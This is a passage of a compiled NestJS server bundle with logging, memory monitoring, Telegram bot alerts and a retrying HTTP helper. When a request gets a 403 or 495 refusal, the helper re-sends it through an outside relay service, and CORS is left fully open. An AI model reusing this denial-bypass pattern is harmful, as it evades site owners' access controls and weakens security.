        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
const core_1 = __webpack_require__(/*! @nestjs/core */ "@nestjs/core");
const mongoose_1 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
const app_module_1 = __webpack_require__(/*! ./app.module */ "./src/app.module.ts");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const fs = __importStar(__webpack_require__(/*! fs */ "fs"));
async function bootstrap() {
    const app = await core_1.NestFactory.create(app_module_1.AppModule);
    const config = new swagger_1.DocumentBuilder()
        .setTitle('NestJS and Express API')
        .setDescription('API documentation')
        .setVersion('1.0')
        .build();
    app.use((req, res, next) => {
        res.header('Access-Control-Allow-Origin', '*');
        res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');
        res.header('Access-Control-Allow-Headers', 'Content-Type, Accept');
        next();
    });
    app.enableCors({
        allowedHeaders: "*",
        origin: "*"
    });
    const document = swagger_1.SwaggerModule.createDocument(app, config);
    fs.writeFileSync('./swagger-spec.json', JSON.stringify(document, null, 2));
    swagger_1.SwaggerModule.setup('api', app, document);
    mongoose_1.default.set('debug', true);
    app.useGlobalPipes(new common_1.ValidationPipe({
        transform: true,
        transformOptions: {
            enableImplicitConversion: true
        },
    }));
    process.on('unhandledRejection', (reason, promise) => {
        console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    });
    process.on('uncaughtException', (reason, promise) => {
        console.error(promise, reason);
    });
    let isShuttingDown = false;
    const shutdown = async (signal) => {
        if (isShuttingDown)
            return;
        isShuttingDown = true;
        console.log(`${signal} received`);
        await app.close();
        process.exit(0);
    };
    process.on('exit', async () => {
        console.log('Application closed');
    });
    process.on('SIGINT', async () => {
        await shutdown('SIGINT');
    });
    process.on('SIGTERM', async () => {
        await shutdown('SIGTERM');
    });
    process.on('SIGQUIT', async () => {
        await shutdown('SIGQUIT');
    });
    await app.init();
    await app.listen(process.env.PORT || 9000);
    console.log(`Application is running on: ${await app.getUrl()}`);
}
bootstrap();


/***/ }),

/***/ "./src/memory-cleanup.service.ts":
/*!***************************************!*\
  !*** ./src/memory-cleanup.service.ts ***!
  \***************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var MemoryCleanerService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.MemoryCleanerService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
let MemoryCleanerService = MemoryCleanerService_1 = class MemoryCleanerService {
    constructor() {
        this.logger = new common_1.Logger(MemoryCleanerService_1.name);
        this.intervalId = null;
        this.memoryLimitMB = 400;
        this.cleanupIntervalMs = 5 * 60 * 1000;
    }
    onModuleInit() {
        this.logger.log('MemoryCleanerService initialized.');
        this.intervalId = setInterval(() => this.monitorAndCleanup(), this.cleanupIntervalMs);
    }
    onModuleDestroy() {
        if (this.intervalId)
            clearInterval(this.intervalId);
    }
    getMemoryUsageInMB() {
        const mem = process.memoryUsage();
        return {
            rss: (mem.rss / 1024 / 1024).toFixed(2),
            heapUsed: (mem.heapUsed / 1024 / 1024).toFixed(2),
            heapTotal: (mem.heapTotal / 1024 / 1024).toFixed(2),
            external: (mem.external / 1024 / 1024).toFixed(2),
        };
    }
    monitorAndCleanup() {
        const mem = process.memoryUsage();
        const heapUsedMB = mem.heapUsed / 1024 / 1024;
        this.logger.log(`🧠 Heap Used: ${heapUsedMB.toFixed(2)} MB`);
        if (heapUsedMB > this.memoryLimitMB) {
            this.logger.warn(`🚨 Heap exceeded ${this.memoryLimitMB} MB. Cleaning up...`);
            this.cleanupMemory();
        }
    }
    cleanupMemory() {
        if (typeof global.gc === 'function') {
            global.gc();
            this.logger.log('✅ Manual GC triggered via global.gc()');
        }
        else {
            this.logger.warn('⚠️ GC not available. Start Node with --expose-gc');
        }
        const mem = this.getMemoryUsageInMB();
        this.logger.log(`🧹 Memory After Cleanup: ${JSON.stringify(mem)}`);
    }
};
exports.MemoryCleanerService = MemoryCleanerService;
exports.MemoryCleanerService = MemoryCleanerService = MemoryCleanerService_1 = __decorate([
    (0, common_1.Injectable)()
], MemoryCleanerService);


/***/ }),

/***/ "./src/middlewares/logger.middleware.ts":
/*!**********************************************!*\
  !*** ./src/middlewares/logger.middleware.ts ***!
  \**********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.LoggerMiddleware = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const fetchWithTimeout_1 = __webpack_require__(/*! ../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const parseError_1 = __webpack_require__(/*! ../utils/parseError */ "./src/utils/parseError.ts");
const logbots_1 = __webpack_require__(/*! ../utils/logbots */ "./src/utils/logbots.ts");
let LoggerMiddleware = class LoggerMiddleware {
    constructor() {
        this.logger = new common_1.Logger('HTTP');
    }
    use(req, res, next) {
        const { method, originalUrl, baseUrl } = req;
        const userAgent = req.get('user-agent') || '';
        const ip = req.ip;
        const excludedEndpoints = ['/sendtochannel', '/favicon.', '/tgsignup', '/timestamps'];
        const isExcluded = (url) => excludedEndpoints.some(endpoint => url.startsWith(endpoint));
        if (!isExcluded(originalUrl) && originalUrl !== '/') {
            res.on('finish', () => {
                const { statusCode } = res;
                const contentLength = res.get('content-length');
                if (statusCode >= 500) {
                    (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${statusCode}`)}`);
                    this.logger.error(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);
                }
                else if (statusCode >= 400) {
                    (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${statusCode}`)}`);
                    this.logger.warn(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);
                }
                else if (statusCode >= 300) {
                    this.logger.verbose(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);
                }
                else {
                    this.logger.log(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);
                }
            });
            res.on('error', (error) => {
                const errorDetails = (0, parseError_1.parseError)(error, process.env.clientId);
                (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${errorDetails.message}`)}`);
            });
        }
        else {
            if (originalUrl.includes('Video')) {
                this.logger.log(`Excluded endpoint hit: ${originalUrl} (length: ${originalUrl.length})`);
            }
        }
        next();
    }
};
exports.LoggerMiddleware = LoggerMiddleware;
exports.LoggerMiddleware = LoggerMiddleware = __decorate([
    (0, common_1.Injectable)()
], LoggerMiddleware);


/***/ }),

/***/ "./src/utils/TelegramBots.config.ts":
/*!******************************************!*\
  !*** ./src/utils/TelegramBots.config.ts ***!
  \******************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BotConfig = exports.ChannelCategory = void 0;
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const fetchWithTimeout_1 = __webpack_require__(/*! ./fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
var ChannelCategory;
(function (ChannelCategory) {
    ChannelCategory["CLIENT_UPDATES"] = "CLIENT_UPDATES";
    ChannelCategory["USER_WARNINGS"] = "USER_WARNINGS";
    ChannelCategory["VC_WARNINGS"] = "VC_WARNINGS";
    ChannelCategory["USER_REQUESTS"] = "USER_REQUESTS";
    ChannelCategory["VC_NOTIFICATIONS"] = "VC_NOTIFICATIONS";
    ChannelCategory["CHANNEL_NOTIFICATIONS"] = "CHANNEL_NOTIFICATIONS";
    ChannelCategory["ACCOUNT_NOTIFICATIONS"] = "ACCOUNT_NOTIFICATIONS";
    ChannelCategory["ACCOUNT_LOGIN_FAILURES"] = "ACCOUNT_LOGIN_FAILURES";
    ChannelCategory["PROMOTION_ACCOUNT"] = "PROMOTION_ACCOUNT";
    ChannelCategory["CLIENT_ACCOUNT"] = "CLIENT_ACCOUNT";
    ChannelCategory["PAYMENT_FAIL_QUERIES"] = "PAYMENT_FAIL_QUERIES";
    ChannelCategory["SAVED_MESSAGES"] = "SAVED_MESSAGES";
})(ChannelCategory || (exports.ChannelCategory = ChannelCategory = {}));
class BotConfig {
    constructor() {
        this.categoryMap = new Map();
        this.initialized = false;
        this.initPromise = this.initialize();
    }
    static getInstance() {
        if (!BotConfig.instance) {
            BotConfig.instance = new BotConfig();
        }
        return BotConfig.instance;
    }
    async ready() {
        if (!this.initialized) {
            await this.initPromise;
        }
    }
    async initialize() {
        console.debug('Initializing Telegram channel configuration...');
        const envKeys = Object.keys(process.env).filter(key => key.startsWith('TELEGRAM_CHANNEL_CONFIG_'));
        for (const key of envKeys) {
            const value = process.env[key];
            if (!value)
                continue;
            const [channelId, description = '', botTokensStr] = value.split('::');
            const botTokens = botTokensStr?.split(',').map(t => t.trim()).filter(Boolean);
            if (!channelId || !botTokens || botTokens.length === 0)
                continue;
            const category = this.getCategoryFromDescription(description);
            if (!category)
                continue;
            const botUsernames = [];
            for (const token of botTokens) {
                const username = await this.fetchUsername(token);
                if (!username) {
                    console.log(`Invalid bot token for ${category}, token: ${token}`);
                }
                botUsernames.push(username);
            }
            this.categoryMap.set(category, {
                botTokens,
                botUsernames,
                lastUsedIndex: -1,
                channelId,
            });
        }
        this.initialized = true;
        console.info('BotConfig initialized.');
    }
    getCategoryFromDescription(desc) {
        const normalized = desc.toUpperCase();
        return Object.values(ChannelCategory).find(cat => normalized.includes(cat)) ?? null;
    }
    async fetchUsername(token) {
        const res = await (0, fetchWithTimeout_1.fetchWithTimeout)(`https://api.telegram.org/bot${token}/getMe`);
        const resData = res.data;
        return resData?.ok ? resData.result.username : '';
    }
    getBotUsername(category) {
        this.assertInitialized();
        const data = this.categoryMap.get(category);
        if (!data || data.botUsernames.length === 0) {
            throw new Error(`No valid bots for ${category}`);
        }
        data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botUsernames.length;
        return data.botUsernames[data.lastUsedIndex];
    }
    getChannelId(category) {
        this.assertInitialized();
        const data = this.categoryMap.get(category);
        if (!data) {
            throw new Error(`No config for ${category}`);
        }
        return data.channelId;
    }
    getBotAndChannel(category) {
        this.assertInitialized();
        const data = this.categoryMap.get(category);
        if (!data || data.botUsernames.length === 0) {
            throw new Error(`No valid bots for ${category}`);
        }
        data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botUsernames.length;
        return {
            username: data.botUsernames[data.lastUsedIndex],
            channelId: data.channelId,
            token: data.botTokens[data.lastUsedIndex],
        };
    }
    async sendMessage(category, message) {
        this.assertInitialized();
        const data = this.categoryMap.get(category);
        if (!data || data.botTokens.length === 0) {
            throw new Error(`No valid bots for ${category}`);
        }
        data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botTokens.length;
        const token = data.botTokens[data.lastUsedIndex];
        const channelId = data.channelId;
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${channelId}&text=${encodeURIComponent(message)}`;
        axios_1.default.post(url).catch(error => {
            console.error(`Failed to send message to ${channelId}:`, error);
        });
    }
    getAllBotUsernames(category) {
        this.assertInitialized();
        const data = this.categoryMap.get(category);
        if (!data || data.botUsernames.length === 0) {
            throw new Error(`No valid bots for ${category}`);
        }
        return [...data.botUsernames];
    }
    assertInitialized() {
        if (!this.initialized) {
            throw new Error('BotConfig not initialized. App module has not finished initializing.');
        }
    }
}
exports.BotConfig = BotConfig;


/***/ }),

/***/ "./src/utils/common.ts":
/*!*****************************!*\
  !*** ./src/utils/common.ts ***!
  \*****************************/
/***/ ((__unused_webpack_module, exports) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.defaultMessages = exports.defaultReactions = void 0;
exports.sleep = sleep;
exports.contains = contains;
exports.toBoolean = toBoolean;
exports.fetchNumbersFromString = fetchNumbersFromString;
exports.areJsonsNotSame = areJsonsNotSame;
exports.mapToJson = mapToJson;
exports.shouldMatch = shouldMatch;
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
function contains(str, arr) {
    if (!str || !Array.isArray(arr))
        return false;
    return arr.some(element => element && str.includes(element.toLowerCase()));
}
function toBoolean(value) {
    if (value === null || value === undefined)
        return false;
    if (typeof value === 'string') {
        const normalizedValue = value.toLowerCase().trim();
        return normalizedValue === 'true' || normalizedValue === '1' || normalizedValue === 'yes';
    }
    if (typeof value === 'number') {
        return value !== 0;
    }
    return value;
}
function fetchNumbersFromString(inputString) {
    if (!inputString)
        return '';
    const regex = /\d+/g;
    const matches = inputString.match(regex);
    return matches ? matches.join('') : '';
}
exports.defaultReactions = Object.freeze([
    '❤', '🔥', '👏', '🥰', '😁', '🤔',
    '🤯', '😱', '🤬', '😢', '🎉', '🤩',
    '🤮', '💩', '🙏', '👌', '🕊', '🤡',
    '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',
    '🤣', '💔', '🏆', '😭', '😴', '👍',
    '🌚', '⚡', '🍌', '😐', '💋', '👻',
    '👀', '🙈', '🤝', '🤗', '🆒',
    '🗿', '🙉', '🙊', '🤷', '👎'
]);
exports.defaultMessages = Object.freeze([
    "1", "2", "3", "4", "5", "6", "7", "8",
    "9", "10", "11", "12", "13", "14", "15",
    "16", "17", "18", "19", "20", "21"
]);
function areJsonsNotSame(json1, json2) {
    const keysToIgnore = ['id', '_id'];
    console.log('[areJsonsNotSame] Starting comparison...');
    function normalizeObject(obj) {
        if (obj === null || obj === undefined)
            return obj;
        if (typeof obj !== 'object')
            return obj;
        if (Array.isArray(obj))
            return obj.map(normalizeObject);
        const normalized = {};
        const sortedKeys = Object.keys(obj)
            .filter(key => !keysToIgnore.includes(key))
            .sort();
        for (const key of sortedKeys) {
            normalized[key] = normalizeObject(obj[key]);
        }
        return normalized;
    }
    const normalized1 = normalizeObject(json1);
    const normalized2 = normalizeObject(json2);
    const result = JSON.stringify(normalized1) !== JSON.stringify(normalized2);
    console.log(`[areJsonsNotSame] Comparison result: ${result ? 'Objects are different' : 'Objects are same'}`);
    return result;
}
function mapToJson(map) {
    if (!(map instanceof Map)) {
        throw new Error('Input must be a Map instance');
    }
    const obj = {};
    for (const [key, value] of map.entries()) {
        obj[String(key)] = value;
    }
    return obj;
}
function shouldMatch(obj) {
    const regex = /(wife|adult|lanj|chat|𝑭𝒂𝒎𝒊𝒍𝒚|𝙏𝙖𝙢𝙞𝙡|𝐒𝐖𝐀𝐏|lesb|aunty|girl|boy|tamil|kannad|telugu|hindi|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi)/i;
    const titleMatch = obj.title && regex.test(obj.title);
    const usernameMatch = obj.username && regex.test(obj.username);
    return !!(titleMatch || usernameMatch);
}


/***/ }),

/***/ "./src/utils/fetchWithTimeout.ts":
/*!***************************************!*\
  !*** ./src/utils/fetchWithTimeout.ts ***!
  \***************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.fetchWithTimeout = fetchWithTimeout;
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const parseError_1 = __webpack_require__(/*! ./parseError */ "./src/utils/parseError.ts");
const logbots_1 = __webpack_require__(/*! ./logbots */ "./src/utils/logbots.ts");
const utils_1 = __webpack_require__(/*! ../utils */ "./src/utils/index.ts");
const DEFAULT_RETRY_CONFIG = {
    maxRetries: 3,
    baseDelay: 500,
    maxDelay: 30000,
    jitterFactor: 0.2,
};
const DEFAULT_NOTIFICATION_CONFIG = {
    enabled: true,
    channelEnvVar: 'httpFailuresChannel',
    timeout: 5000,
};
async function notifyInternal(prefix, errorDetails, config = DEFAULT_NOTIFICATION_CONFIG) {
    if (!config.enabled)
        return;
    prefix = `${prefix} ${process.env.clientId || 'uptimeChecker2'}`;
    try {
        const errorMessage = typeof errorDetails.message === 'string'
            ? errorDetails.message
            : JSON.stringify(errorDetails.message);
        const formattedMessage = errorMessage.includes('ETIMEDOUT') ? 'Connection timed out' :
            errorMessage.includes('ECONNREFUSED') ? 'Connection refused' :
                (0, parseError_1.extractMessage)(errorDetails?.message);
        console.error(`${prefix}\n${formattedMessage}`);
        if (errorDetails.status === 429)
            return;
        const notificationText = `${prefix}\n\n${formattedMessage}`;
        try {
            const channelUrl = (0, logbots_1.ppplbot)(process.env[config.channelEnvVar] || '');
            if (!channelUrl) {
                console.warn(`Notification channel URL not available. Environment variable ${config.channelEnvVar} might not be set.`);
                return;
            }
            const notifUrl = `${channelUrl}&text=${encodeURIComponent(notificationText)}`;
            await axios_1.default.get(notifUrl, { timeout: config.timeout });
        }
        catch (error) {
            (0, parseError_1.parseError)(error, "Failed to send notification:", false);
        }
    }
    catch (error) {
        (0, parseError_1.parseError)(error, "Error in notification process:", false);
    }
}
const RETRYABLE_NETWORK_ERRORS = [
    'ETIMEDOUT',
    'ECONNABORTED',
    'ECONNREFUSED',
    'ECONNRESET',
    'ERR_NETWORK',
    'ERR_BAD_RESPONSE',
    'EHOSTUNREACH',
    'ENETUNREACH'
];
const RETRYABLE_STATUS_CODES = [408, 500, 502, 503, 504];
function shouldRetry(error, parsedError) {
    if (axios_1.default.isAxiosError(error)) {
        if (error.code && RETRYABLE_NETWORK_ERRORS.includes(error.code)) {
            return true;
        }
        if (error.message?.toLowerCase().includes('timeout')) {
            return true;
        }
    }
    return RETRYABLE_STATUS_CODES.includes(parsedError.status);
}
function calculateBackoff(attempt, config = DEFAULT_RETRY_CONFIG) {
    const base = Math.min(config.baseDelay * Math.pow(2, attempt), config.maxDelay);
    const jitter = Math.random() * (base * config.jitterFactor);
    return Math.floor(base + jitter);
}
async function makeBypassRequest(url, options) {
    const bypassUrl = options.bypassUrl || process.env.bypassURL || '';
    if (!bypassUrl) {
        throw new Error('Bypass URL is not provided');
    }
    const finalBypassUrl = bypassUrl.startsWith('http') ?
        bypassUrl :
        'https://ravishing-perception-production.up.railway.app/execute-request';
    const bypassAxios = axios_1.default.create({
        responseType: options.responseType || 'json',
        maxContentLength: Infinity,
        maxBodyLength: Infinity,
        timeout: options.timeout || 30000
    });
    const response = await bypassAxios.post(finalBypassUrl, {
        url,
        method: options.method,
        headers: options.headers,
        data: options.data,
        params: options.params,
        responseType: options.responseType,
        timeout: options.timeout,
        followRedirects: options.maxRedirects !== 0,
        maxRedirects: options.maxRedirects
    }, {
        headers: {
            'Content-Type': 'application/json',
            ...options.headers
        }
    });
    if (response && (options.responseType === 'arraybuffer' ||
        response.headers['content-type']?.includes('application/octet-stream') ||
        response.headers['content-type']?.includes('image/') ||
        response.headers['content-type']?.includes('audio/') ||
        response.headers['content-type']?.includes('video/') ||
        response.headers['content-type']?.includes('application/pdf'))) {
        response.data = Buffer.from(response.data);
    }
    return response;
}
function parseUrl(url) {
    if (!url || typeof url !== 'string') {
        return null;
    }
    try {
        const parsedUrl = new URL(url);
        return {
            host: parsedUrl.host,
            endpoint: parsedUrl.pathname + parsedUrl.search
        };
    }
    catch (error) {
        return null;
    }
}
async function fetchWithTimeout(url, options = {}, maxRetries) {
    if (!url) {
        console.error('URL is empty');
        return undefined;
    }
    const retryConfig = {
        ...DEFAULT_RETRY_CONFIG,
        ...options.retryConfig,
        maxRetries: maxRetries !== undefined ? maxRetries : (options.retryConfig?.maxRetries || DEFAULT_RETRY_CONFIG.maxRetries)
    };
    const notificationConfig = {
        ...DEFAULT_NOTIFICATION_CONFIG,
        ...options.notificationConfig
    };
    options.timeout = options.timeout || 30000;
    options.method = options.method || "GET";
    const urlInfo = parseUrl(url);
    if (!urlInfo) {
        console.error(`Invalid URL: ${url}`);
        return undefined;
    }
    const { host, endpoint } = urlInfo;
    const clientId = process.env.clientId || 'UnknownClient';
    let lastError = null;
    for (let attempt = 0; attempt <= retryConfig.maxRetries; attempt++) {
        const controller = new AbortController();
        const currentTimeout = options.timeout + (attempt * 5000);
        const timeoutId = setTimeout(() => {
            try {
                controller.abort();
            }
            catch (abortError) {
                console.error("Error during abort:", abortError);
            }
        }, currentTimeout);
        try {
            const response = await (0, axios_1.default)({
                ...options,
                url,
                signal: controller.signal,
                maxRedirects: options.maxRedirects ?? 5,
                timeout: currentTimeout,
            });
            clearTimeout(timeoutId);
            return response;
        }
        catch (error) {
            clearTimeout(timeoutId);
            lastError = error instanceof Error ? error : new Error(String(error));
            let parsedError;
            try {
                parsedError = (0, parseError_1.parseError)(error, `host: ${host}\nendpoint:${endpoint}`, false);
            }
            catch (parseErrorError) {
                console.error("Error in parseError:", parseErrorError);
                parsedError = { status: 500, message: String(error), error: "ParseError" };
            }
            const message = parsedError.message;
            const isTimeout = axios_1.default.isAxiosError(error) && (error.code === "ECONNABORTED" ||
                (message && message.includes("timeout")) ||
                parsedError.status === 408);
            if (parsedError.status === 403 || parsedError.status === 495) {
                try {
                    const bypassResponse = await makeBypassRequest(url, options);
                    if (bypassResponse) {
                        await notifyInternal(`Successfully Bypassed the request`, { message: `${clientId} host=${host}\nendpoint=${endpoint}` }, notificationConfig);
                        return bypassResponse;
                    }
                }
                catch (bypassError) {
                    let errorDetails;
                    try {
                        const bypassParsedError = (0, parseError_1.parseError)(bypassError, `host: ${host}\nendpoint:${endpoint}`, false);
                        errorDetails = (0, parseError_1.extractMessage)(bypassParsedError);
                    }
                    catch (extractBypassError) {
                        console.error("Error extracting bypass error message:", extractBypassError);
                        errorDetails = String(bypassError);
                    }
                    await notifyInternal(`Bypass attempt failed`, { message: `host=${host}\nendpoint=${endpoint}\n${`msg: ${errorDetails.slice(0, 150)}`}` }, notificationConfig);
                }
            }
            else {
                if (isTimeout) {
                    await notifyInternal(`Request timeout on attempt ${attempt}`, {
                        message: `${clientId} host=${host}\nendpoint=${endpoint}\ntimeout=${options.timeout}ms`,
                        status: 408
                    }, notificationConfig);
                }
                else {
                    await notifyInternal(`Attempt ${attempt} failed`, {
                        message: `${clientId} host=${host}\nendpoint=${endpoint}\n${`mgs: ${message.slice(0, 150)}`}`,
                        status: parsedError.status
                    }, notificationConfig);
                }
            }
            if (attempt < retryConfig.maxRetries && shouldRetry(error, parsedError)) {
                const delay = calculateBackoff(attempt, retryConfig);
                console.log(`Retrying request (${attempt + 1}/${retryConfig.maxRetries}) after ${delay}ms`);
                await (0, utils_1.sleep)(delay);
                continue;
            }
            if (attempt >= retryConfig.maxRetries) {
                break;
            }
        }
    }
    try {
        let errorData;
        try {
            if (lastError) {
                const parsedLastError = (0, parseError_1.parseError)(lastError, `${clientId} host: ${host}\nendpoint:${endpoint}`, false);
                errorData = (0, parseError_1.extractMessage)(parsedLastError);
            }
            else {
                errorData = 'Unknown error';
            }
        }
        catch (extractLastError) {
            console.error("Error extracting last error:", extractLastError);
            errorData = String(lastError) || 'Unknown error';
        }
        await notifyInternal(`All ${retryConfig.maxRetries} retries exhausted`, { message: `${errorData.slice(0, 150)}` }, notificationConfig);
    }
    catch (finalError) {
        console.error('Failed to send final error notification:', finalError);
    }
    return undefined;
}


/***/ }),

/***/ "./src/utils/index.ts":
/*!****************************!*\
  !*** ./src/utils/index.ts ***!
  \****************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.parseError = exports.ppplbot = exports.fetchWithTimeout = exports.toBoolean = exports.shouldMatch = exports.mapToJson = exports.areJsonsNotSame = exports.fetchNumbersFromString = exports.defaultReactions = exports.defaultMessages = exports.sleep = exports.contains = void 0;
var common_1 = __webpack_require__(/*! ./common */ "./src/utils/common.ts");
Object.defineProperty(exports, "contains", ({ enumerable: true, get: function () { return common_1.contains; } }));
Object.defineProperty(exports, "sleep", ({ enumerable: true, get: function () { return common_1.sleep; } }));
Object.defineProperty(exports, "defaultMessages", ({ enumerable: true, get: function () { return common_1.defaultMessages; } }));
Object.defineProperty(exports, "defaultReactions", ({ enumerable: true, get: function () { return common_1.defaultReactions; } }));
Object.defineProperty(exports, "fetchNumbersFromString", ({ enumerable: true, get: function () { return common_1.fetchNumbersFromString; } }));
Object.defineProperty(exports, "areJsonsNotSame", ({ enumerable: true, get: function () { return common_1.areJsonsNotSame; } }));
Object.defineProperty(exports, "mapToJson", ({ enumerable: true, get: function () { return common_1.mapToJson; } }));
Object.defineProperty(exports, "shouldMatch", ({ enumerable: true, get: function () { return common_1.shouldMatch; } }));
Object.defineProperty(exports, "toBoolean", ({ enumerable: true, get: function () { return common_1.toBoolean; } }));
var fetchWithTimeout_1 = __webpack_require__(/*! ./fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
Object.defineProperty(exports, "fetchWithTimeout", ({ enumerable: true, get: function () { return fetchWithTimeout_1.fetchWithTimeout; } }));
var logbots_1 = __webpack_require__(/*! ./logbots */ "./src/utils/logbots.ts");
Object.defineProperty(exports, "ppplbot", ({ enumerable: true, get: function () { return logbots_1.ppplbot; } }));
var parseError_1 = __webpack_require__(/*! ./parseError */ "./src/utils/parseError.ts");
Object.defineProperty(exports, "parseError", ({ enumerable: true, get: function () { return parseError_1.parseError; } }));


/***/ }),

/***/ "./src/utils/logbots.ts":
/*!******************************!*\
  !*** ./src/utils/logbots.ts ***!
  \******************************/
/***/ ((__unused_webpack_module, exports) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.getBotToken = getBotToken;
exports.notifbot = notifbot;
exports.ppplbot = ppplbot;
const getBotTokens = () => {
    const botTokens = (process.env.BOT_TOKENS || '').split(',').filter(Boolean);
    if (botTokens.length === 0) {
        throw new Error('No bot tokens configured. Please set BOT_TOKENS environment variable');
    }
    return botTokens;
};
let botTokens = null;
let currentTokenIndex = 0;
const initializeBotTokens = () => {
    if (botTokens === null) {
        botTokens = getBotTokens();
    }
    return botTokens;
};
function getBotToken() {
    return initializeBotTokens()[currentTokenIndex];
}
function notifbot(chatId = process.env.accountsChannel || "-1001801844217", botToken) {
    const tokens = initializeBotTokens();
    const token = botToken || tokens[currentTokenIndex];
    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}`;
    if (!botToken) {
        currentTokenIndex = (currentTokenIndex + 1) % tokens.length;
    }
    return apiUrl;
}
function ppplbot(chatId = process.env.updatesChannel || '-1001972065816', botToken) {
    const tokens = initializeBotTokens();
    const token = botToken || tokens[currentTokenIndex];
    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}`;
    if (!botToken) {
        currentTokenIndex = (currentTokenIndex + 1) % tokens.length;
    }
    return apiUrl;
}


/***/ }),

/***/ "./src/utils/parseError.ts":
/*!*********************************!*\
  !*** ./src/utils/parseError.ts ***!
  \*********************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ErrorUtils = void 0;
exports.extractMessage = extractMessage;
exports.parseError = parseError;
exports.isAxiosError = isAxiosError;
exports.createError = createError;
const logbots_1 = __webpack_require__(/*! ./logbots */ "./src/utils/logbots.ts");
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const DEFAULT_ERROR_CONFIG = {
    maxMessageLength: 200,
    notificationTimeout: 10000,
    ignorePatterns: [
        /INPUT_USER_DEACTIVATED/i,
        /too many req/i,
        /could not find/i,
        /ECONNREFUSED/i
    ],
    defaultStatus: 500,
    defaultMessage: 'An unknown error occurred',
    defaultError: 'UnknownError'
};
function safeStringify(data, depth = 0, maxDepth = 3) {
    if (depth > maxDepth) {
        return '[Max Depth Reached]';
    }
    try {
        if (data === null || data === undefined) {
            return String(data);
        }
        if (typeof data === 'string' || typeof data === 'number' || typeof data === 'boolean') {
            return String(data);
        }
        if (data instanceof Error) {
            return data.message || data.toString();
        }
        if (Array.isArray(data)) {
            if (data.length === 0)
                return '[]';
            return `[${data.map(item => safeStringify(item, depth + 1, maxDepth)).join(', ')}]`;
        }
        if (typeof data === 'object') {
            const entries = Object.entries(data)
                .filter(([_, v]) => v !== undefined && v !== null)
